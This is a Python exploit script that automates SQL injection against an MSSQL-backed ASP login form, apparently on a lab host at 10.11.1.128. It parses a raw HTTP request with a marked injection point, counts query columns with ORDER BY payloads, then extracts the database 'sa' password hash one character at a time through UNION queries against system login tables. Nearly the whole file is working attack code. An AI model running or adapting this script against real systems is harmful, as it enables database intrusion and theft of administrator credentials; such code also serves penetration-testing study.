#!/usr/bin/env python3
import threading
import requests
import argparse
import logging
import string
import json
import time
import sys
import io

REQ = '''POST /login-off.asp HTTP/1.1
Host: 10.11.1.128
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.11.1.128/base-login.asp
Content-Type: application/x-www-form-urlencoded
Content-Length: 46
Cookie: ASPSESSIONIDCSATCCQT=LABDGGBALDJKFNHBJBKCEIJC
Connection: keep-alive
Upgrade-Insecure-Requests: 1

txtLoginID={}&txtPassword=asa&cmdSubmit=Login
'''

# https://hydrasky.com/network-security/mssql-server-injection-tutorial/
MSSQL_ORDER_BY      = "TRASH' ORDER BY {};-- "
MSSQL_UNION         = "TRASH' UNION ALL SELECT {};-- "
MSSQL_EXFIL         = "ASCII(SUBSTRING(({}),{},1))={}"
MSSQL2000_HASH      = "SELECT master.dbo.fn_varbintohexstr(password) FROM master.dbo.sysxlogins WHERE name = 'sa'"
MSSQL2005_HASH      = "SELECT master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins WHERE name = 'sa'"

def PREDICATE(res):
    if "ACCESS DENIED" in res.text:
        return False
    else:
        return True


class esc:
    black       = '\x1b[30m'
    blackBg     = '\x1b[40m'
    red         = '\x1b[31m'
    redBg       = '\x1b[41m'
    green       = '\x1b[32m'
    greenBg     = '\x1b[42m'
    yellow      = '\x1b[33m'
    yellowBg    = '\x1b[43m'
    blue        = '\x1b[34m' 
    blueBg      = '\x1b[44m' 
    magenta     = '\x1b[35m'
    magentaBg   = '\x1b[45m'
    cyan        = '\x1b[36m'
    cyanBg      = '\x1b[46m'
    white       = '\x1b[37m'
    whiteBg     = '\x1b[47m'
    
    up          = '\x1b[{}A'
    down        = '\x1b[{}B'
    right       = '\x1b[{}C'
    left        = '\x1b[{}D'

    end = '\x1b[0m'

class unicode:
    spinner = ['⣾', '⣷', '⣯', '⣟', '⡿', '⢿', '⣻', '⣽']

class ParsedRequest:
    def __init__(self, protocol, rline, headers, body, ploc):
        self.protocol = protocol
        self.request_line = rline
        self.headers = headers
        self.body = body
        self.payload_location = ploc

def parse_request(raw, options):
    if isinstance(raw, str):
        raw = io.StringIO(raw)
    payload_header = ''
    with raw as f:
        reqLine = f.readline()
        
        headers = {}
        while True:
            line = f.readline()
            if line.strip() == '':
                break # Done parsing headers
            name, value = line.split(':',1)
            if name == 'Content-Length' or name == 'Accept' or name == 'Accept-Encoding' or name == 'Accept-Language':
                continue # Skip, let requests handle these
            if '{}' in value:
                payload_header = name
            headers[name] = value.strip()
        body = f.read()

        if '{}' in reqLine:
            ploc = 'url'
        elif payload_header != '':
            ploc = payload_header
        elif '{}' in body:
            ploc = 'body'
        else:
            logging.info('[!] Error: no injection point ({}) found!')
            exit(-1)

        if logging.getLogger().level == logging.DEBUG:
            logging.debug(f'[*] Request line = {reqLine}')
            logging.debug(f'[*] Headers = {json.dumps(headers, indent=4, sort_keys=True)}')
            logging.debug(f'[*] Body = {body}')

    return ParsedRequest('https' if options.ssl else 'http', reqLine, headers, body, ploc)

def format_payload(pReq, payload):
    method, endpoint, _ = pReq.request_line.split(' ')
    endpoint_formatted = endpoint.format(payload) if pReq.payload_location == 'url' else endpoint
    body_formatted = pReq.body.format(requests.utils.quote(payload)) if pReq.payload_location == 'body' else pReq.body
    if pReq.payload_location != 'url' and pReq.payload_location != 'body':
        tmp = pReq.headers.copy()
        tmp = tmp[pReq.payload_location].format(payload)
        headers_formatted = tmp
    else:
        headers_formatted = pReq.headers

    return requests.Request(method, f'{pReq.protocol}://{pReq.headers["Host"]}{endpoint_formatted}', data=body_formatted, headers=headers_formatted)

def get_num_columns(pReq, s):
    count = 1 
    while True:
        r = format_payload(pReq, MSSQL_ORDER_BY.format(count))
        res = s.send(s.prepare_request(r))
        if PREDICATE(res): return count-1
        count += 1

def get_query_result_len(pReq, s, query, filler):
    size = 1
    while True:
        r = format_payload(pReq, MSSQL_UNION.format(f"{filler} WHERE LEN(({MSSQL2000_HASH}))={size}"))
        res = s.send(s.prepare_request(r))
        if PREDICATE(res): break
        size += 1
    logging.info(f'[+] Query result lenght = {size}')
    return size

def start_loading_animation():
    global tick
    global hash
    t = threading.Timer(0.3, start_loading_animation)
    t.daemon = True
    t.start()
    sys.stdout.write(f"{esc.left.format(1000)}[{esc.red}{unicode.spinner[tick%len(unicode.spinner)]}{esc.end}] {hash}")
    sys.stdout.flush()
    tick += 1

def get_sa_hash(pReq, s, num_col):
    filler = ','.join(['1']*num_col)
    r = format_payload(pReq, MSSQL_UNION.format(filler))
    res = s.send(s.prepare_request(r))
    if not PREDICATE(res):
        logging.critical('[!] Error: unable to perform union query !')
        exit(-2)
    
    global hash
    global tick
    hash = ''
    tick = 1
    start_loading_animation() 
    idx = 1
    while True:
        found = False
        for ch in string.hexdigits + 'x':
            r = format_payload(pReq, MSSQL_UNION.format(f'{filler} WHERE {MSSQL_EXFIL.format(MSSQL2000_HASH, idx, ord(ch))}'))
            res = s.send(s.prepare_request(r))
            if not PREDICATE(res): continue
            hash += ch
            idx += 1
            found = True
            break
        if not found: break
    sys.stdout.write(esc.left.format(1000))
    return hash
        
def pwn(pReq, options):
    s = requests.Session()
    if options.debug:
        s.proxies.update({'http': '127.0.0.1:8080'})
    num_col = get_num_columns(pReq, s)
    print(f'\n[{esc.green}+{esc.end}] Query has {num_col} columns')
    print(f'[{esc.yellow}!{esc.end}] Exfiltrating sa hash, this can take a while')
    hash = get_sa_hash(pReq, s, num_col)
    print (f'[{esc.green}+{esc.end}] sa:{hash}')

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('request', action='store',
    help='Path to a request file with injection point marked with {}')
    parser.add_argument('-s', '--ssl', action='store_true',
    help='Use https')
    parser.add_argument('-d', '--debug', action='store_true',
    help='Turn DEBUG output, proxy traffic via 127.0.0.1:8080, ignore -r and use REQ global variable')

    if len(sys.argv) < 2:
        parser.print_help()
        exit(-3)

    options = parser.parse_args()

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        pReq = parse_request(REQ, options)
    else:
        logging.getLogger().setLevel(logging.INFO)
        with open(options.request, 'r') as f:
            pReq = parse_request(f, options)

    pwn(pReq, options)

main()
